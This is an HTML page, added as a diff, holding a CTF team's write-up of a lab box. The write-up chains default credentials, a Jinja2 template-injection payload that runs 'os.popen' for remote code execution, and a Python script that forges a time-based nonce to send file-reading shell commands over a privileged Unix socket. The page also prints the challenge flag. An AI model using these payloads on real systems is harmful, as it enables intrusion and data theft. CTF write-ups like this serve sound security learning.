@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>echochamber-user · CryoVault CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="Default credentials lead to a Jinja2 preview feature that renders unsanitised input. RCE as analyst exposes the sentinel source, so the time-based socket nonce can be computed and used to read the user flag." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=0e2bdd96" />
+<link rel="stylesheet" href="../css/pages.css?v=8dc67e7f" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <span>echochamber-user</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>echochamber-user <span class="page-sub">SSTI to RCE and a nonce-gated socket</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-pwn">pwn</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>Target <code>10.48.151.156</code>: SSH (22) and nginx fronting an &quot;Alert Review Console&quot; (80). The <code>/login</code> page prints default credentials (<code>analyst</code>/<code>analyst</code>) in plaintext; the footer hints at keystroke telemetry via <code>libechotap.so</code>.</p>
+<p><strong>SSTI → RCE:</strong> the &quot;preview a draft update&quot; feature POSTs <code>{&quot;title&quot;,&quot;body&quot;}</code> to <code>/api/alert/preview</code> and renders <code>body</code> through Jinja2 without sanitization - <code>{{7*7}}</code> → <code>49</code> confirms it. Escalating with <code>{{ self.__init__.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;id&quot;).read() }}</code> gives RCE as <code>analyst</code> (uid=1001, groups <code>analyst</code>, <code>echo-log</code>).</p>
+<p><strong>Enumeration via RCE:</strong> the alert queue leaks a classifier spec path, mentions the &quot;warden&quot; symlink-swapping decoy mechanism, and a dispatch table at <code>/etc/sentinel/dispatch.json</code> exposing a <code>shell</code> handler gated by <code>nonce_time</code>.</p>
+<p><strong>The sentinel socket:</strong> <code>/opt/sentinel/sentinel.py</code> reveals a Unix socket at <code>/run/sentinel/ctrl.sock</code>, run by the <code>sentinel</code> user with <strong>CAP_DAC_READ_SEARCH</strong> (can read any file regardless of permissions). Its <code>exec_shell</code> handler is gated by <code>nonce = sha256(f&quot;{minute_epoch}:{SALT}&quot;)[:16]</code>, <code>SALT = &quot;sentinel-salt-v1-a3b7c2d9&quot;</code>, accepting ±1 minute of drift - computable entirely from the leaked source.</p>
+<figure class="wu-code" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">t = <span class="hljs-built_in">int</span>(time.time()) // <span class="hljs-number">60</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">nonce = hashlib.sha256(<span class="hljs-string">f&quot;<span class="hljs-subst">{t}</span>:sentinel-salt-v1-a3b7c2d9&quot;</span>.encode()).hexdigest()[:<span class="hljs-number">16</span>]</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">cmd = base64.b64encode(<span class="hljs-string">b&quot;cat /home/sentinel/*&quot;</span>).decode()</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">s.connect(<span class="hljs-string">&quot;/run/sentinel/ctrl.sock&quot;</span>)</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">s.sendall(json.dumps({<span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-string">&quot;nonce&quot;</span>: nonce, <span class="hljs-string">&quot;payload&quot;</span>: cmd}).encode() + <span class="hljs-string">b&quot;\n&quot;</span>)</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}</span></span></code></pre>
+      
+    </figure><p>Decoy flags exist at <code>/var/lib/warden/decoy/{user,root}.txt</code> - traps placed by the symlink-swapping &quot;warden&quot; mechanism. Attack chain: default creds → SSTI → RCE as analyst → read sentinel source → compute nonce → socket shell as sentinel (with CAP_DAC_READ_SEARCH) → user flag.</p>
+
+    </article>
+    
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="slab.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">slab</span></a>
+    <a class="wu-pager-link wu-pager-next" href="echochamber-root.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">echochamber-root</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=4dd8bec6"></script>
+</body>
+</html>
